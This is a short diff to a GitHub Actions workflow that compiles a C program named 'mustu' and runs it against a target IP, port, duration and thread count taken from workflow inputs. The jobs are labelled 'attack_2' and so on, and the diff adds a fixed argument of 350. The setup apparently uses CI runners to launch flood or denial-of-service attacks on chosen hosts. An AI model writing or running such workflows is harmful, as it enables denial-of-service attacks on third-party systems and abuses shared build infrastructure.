@@ -26,7 +26,7 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     - run: gcc -o mustu mustu.c -lpthread
-    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 350 ${{ github.event.inputs.threads }}
 
   attack_2:
     runs-on: ubuntu-latest
